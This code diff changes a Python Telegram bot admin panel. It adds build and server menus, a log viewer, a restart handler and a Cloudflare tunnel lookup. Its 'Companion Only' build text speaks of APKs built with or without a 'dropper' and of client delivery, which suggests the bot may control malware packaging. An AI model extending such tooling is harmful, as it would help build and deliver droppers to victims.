@@ -884,10 +884,10 @@ def kb_main() -> types.InlineKeyboardMarkup:
     kb = types.InlineKeyboardMarkup(row_width=2)
     kb.add(
         types.InlineKeyboardButton("👥 Clients",  callback_data="nav_clients"),
-        types.InlineKeyboardButton("🖥 Server",   callback_data="nav_server"),
+        types.InlineKeyboardButton("🏗 Build",    callback_data="nav_build"),
     )
     kb.add(
-        types.InlineKeyboardButton("📊 Stats",    callback_data="nav_stats"),
+        types.InlineKeyboardButton("🖥 Server",   callback_data="nav_server"),
         types.InlineKeyboardButton("⚙️ Settings", callback_data="nav_settings"),
     )
     return kb
@@ -1083,35 +1083,40 @@ def kb_back_home() -> types.InlineKeyboardMarkup:
 def kb_server() -> types.InlineKeyboardMarkup:
     kb = types.InlineKeyboardMarkup(row_width=2)
     kb.add(
-        types.InlineKeyboardButton("🔄 Refresh", callback_data="nav_server"),
-        types.InlineKeyboardButton("🔙 Back",    callback_data="nav_home"),
+        types.InlineKeyboardButton("🔄 Refresh",    callback_data="nav_server"),
+        types.InlineKeyboardButton("📋 View Logs",  callback_data="server_logs"),
     )
+    kb.add(
+        types.InlineKeyboardButton("♻️ Restart Bot", callback_data="server_restart"),
+        types.InlineKeyboardButton("🔗 Tunnel URL",  callback_data="server_tunnel"),
+    )
+    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="nav_home"))
     return kb
 
 
 def kb_settings() -> types.InlineKeyboardMarkup:
     kb = types.InlineKeyboardMarkup(row_width=1)
     kb.add(types.InlineKeyboardButton(
-        "🔐 Change PIN",         callback_data="settings_change_pin"))
+        "🔐 Change PIN",        callback_data="settings_change_pin"))
     kb.add(types.InlineKeyboardButton(
-        "🔑 Change 2FA Secret",  callback_data="settings_change_2fa"))
+        "🔑 Change 2FA Secret", callback_data="settings_change_2fa"))
     kb.add(types.InlineKeyboardButton(
-        "🚦 Production Control", callback_data="prod_menu"))
-    kb.add(types.InlineKeyboardButton(
-        "🔙 Back",               callback_data="nav_home"))
+        "🔙 Back",              callback_data="nav_home"))
     return kb
 
 
-def kb_prod_menu() -> types.InlineKeyboardMarkup:
+def kb_build() -> types.InlineKeyboardMarkup:
+    """Top-level Build menu — dev test, companion-only, deploy, history, rollback."""
     kb = types.InlineKeyboardMarkup(row_width=1)
-    # ── Correct dev-first workflow order ─────────────────────────────────────
-    # Step 1: Check what's on dev
+    # ── Step 1: Check dev status ──────────────────────────────────────────────
     kb.add(types.InlineKeyboardButton(
         "📋 Dev Status",           callback_data="prod_dev_status"))
-    # Step 2: Build & test dev branch
+    # ── Step 2: Build & test ──────────────────────────────────────────────────
     kb.add(types.InlineKeyboardButton(
-        "🧪 Test Build",           callback_data="prod_test_build"))
-    # Step 3: Merge dev → main after test passes
+        "🧪 Dev Test Build",       callback_data="prod_test_build"))
+    kb.add(types.InlineKeyboardButton(
+        "📦 Companion Only",       callback_data="prod_companion_only"))
+    # ── Step 3: Deploy ────────────────────────────────────────────────────────
     kb.add(types.InlineKeyboardButton(
         "🚀 Deploy to Production", callback_data="prod_deploy"))
     # ── Advanced ──────────────────────────────────────────────────────────────
@@ -1125,8 +1130,13 @@ def kb_prod_menu() -> types.InlineKeyboardMarkup:
     kb.add(types.InlineKeyboardButton(
         "⚠️ Sync dev ← main",     callback_data="prod_sync_dev"))
     kb.add(types.InlineKeyboardButton(
-        "🔙 Back",                 callback_data="nav_settings"))
+        "🔙 Back",                 callback_data="nav_home"))
     return kb
+
+
+def kb_prod_menu() -> types.InlineKeyboardMarkup:
+    """Alias kept for internal prod-flow sub-pages that reference it directly."""
+    return kb_build()
 
 
 def kb_prod_test_build_type() -> types.InlineKeyboardMarkup:
@@ -3084,11 +3094,103 @@ def handle_callback(call):
     elif data == "nav_server":
         safe_edit(chat_id, msg_id, text_server_status(), kb_server())
 
+    elif data == "server_logs":
+        try:
+            import subprocess
+            result = subprocess.run(
+                ["journalctl", "-u", "vaultguard_telegram", "-n", "50",
+                 "--no-pager", "--output=short"],
+                capture_output=True, text=True, timeout=10
+            )
+            log_text = result.stdout.strip() or "(no log output)"
+        except Exception as e:
+            log_text = f"(error reading logs: {e})"
+        # Truncate to fit Telegram 4096 char limit
+        max_len = 3800
+        if len(log_text) > max_len:
+            log_text = "…" + log_text[-max_len:]
+        safe_edit(chat_id, msg_id,
+                  f"📋 <b>Bot Logs (last 50 lines)</b>\n"
+                  f"━━━━━━━━━━━━━━━━━━━━\n"
+                  f"<code>{log_text}</code>",
+                  kb_server())
+
+    elif data == "server_tunnel":
+        try:
+            import subprocess
+            result = subprocess.run(
+                ["journalctl", "-u", "vaultguard_cloudflare", "-n", "20",
+                 "--no-pager", "--output=short"],
+                capture_output=True, text=True, timeout=10
+            )
+            lines = result.stdout.strip().splitlines()
+            # Find trycloudflare URL
+            tunnel_url = next(
+                (ln for ln in reversed(lines) if "trycloudflare.com" in ln or ".cfargotunnel.com" in ln),
+                None
+            )
+        except Exception:
+            tunnel_url = None
+        if tunnel_url:
+            safe_edit(chat_id, msg_id,
+                      f"🔗 <b>Tunnel URL</b>\n"
+                      f"━━━━━━━━━━━━━━━━━━━━\n"
+                      f"<code>{tunnel_url.strip()}</code>",
+                      kb_server())
+        else:
+            safe_edit(chat_id, msg_id,
+                      "🔗 <b>Tunnel URL</b>\n"
+                      "━━━━━━━━━━━━━━━━━━━━\n"
+                      "⚠️ No active tunnel URL found.\n"
+                      "Check Cloudflare service status.",
+                      kb_server())
+
+    elif data == "server_restart":
+        safe_edit(chat_id, msg_id,
+                  "♻️ <b>Restart Bot</b>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  "⏳ Restarting vaultguard_telegram service…",
+                  kb_back_home())
+        try:
+            import subprocess
+            result = subprocess.run(
+                ["systemctl", "restart", "vaultguard_telegram"],
+                capture_output=True, text=True, timeout=15
+            )
+            if result.returncode == 0:
+                safe_edit(chat_id, msg_id,
+                          "♻️ <b>Restart Bot</b>\n"
+                          "━━━━━━━━━━━━━━━━━━━━\n"
+                          "✅ Bot service restarted successfully.\n"
+                          "🔄 Reconnecting…",
+                          kb_back_home())
+            else:
+                err = result.stderr.strip() or result.stdout.strip()
+                safe_edit(chat_id, msg_id,
+                          f"♻️ <b>Restart Bot</b>\n"
+                          f"━━━━━━━━━━━━━━━━━━━━\n"
+                          f"❌ Restart failed:\n<code>{err[:800]}</code>",
+                          kb_server())
+        except Exception as e:
+            safe_edit(chat_id, msg_id,
+                      f"♻️ <b>Restart Bot</b>\n"
+                      f"━━━━━━━━━━━━━━━━━━━━\n"
+                      f"❌ Error: <code>{e}</code>",
+                      kb_server())
+
     elif data == "nav_stats":
         safe_edit(chat_id, msg_id, text_global_stats(), kb_back_home())
 
     elif data == "nav_settings":
         safe_edit(chat_id, msg_id, text_settings(chat_id), kb_settings())
+
+    elif data == "nav_build":
+        safe_edit(chat_id, msg_id,
+                  "🏗 <b>Build Control</b>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  "⏳ Loading branch status…",
+                  kb_build())
+        safe_edit(chat_id, msg_id, text_prod_menu(), kb_build())
 
     elif data == "add_client":
         add_client_buf[str(chat_id)] = {"field": "username", "data": {}}
@@ -3395,13 +3497,23 @@ def handle_callback(call):
     # ── Production Control ────────────────────────────────────────────────────
 
     elif data == "prod_menu":
-        # Show menu instantly — then fill in live data
+        # Route back to Build menu (prod_menu is now aliased to kb_build)
         safe_edit(chat_id, msg_id,
-                  "🚦 <b>Production Control</b>\n"
+                  "🏗 <b>Build Control</b>\n"
                   "━━━━━━━━━━━━━━━━━━━━\n"
                   "⏳ Loading branch status…",
-                  kb_prod_menu())
-        safe_edit(chat_id, msg_id, text_prod_menu(), kb_prod_menu())
+                  kb_build())
+        safe_edit(chat_id, msg_id, text_prod_menu(), kb_build())
+
+    elif data == "prod_companion_only":
+        # Companion-only quick build — routes into test-build companion flow
+        safe_edit(chat_id, msg_id,
+                  "📦 <b>Companion Only Build</b>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  "Build companion APK only (no dropper).\n"
+                  "   No Nova, no dropper — fast build\n\n"
+                  "⚠️ No client delivery — admin only.",
+                  kb_prod_test_build_type())
 
     elif data == "prod_dev_status":
         safe_edit(chat_id, msg_id,
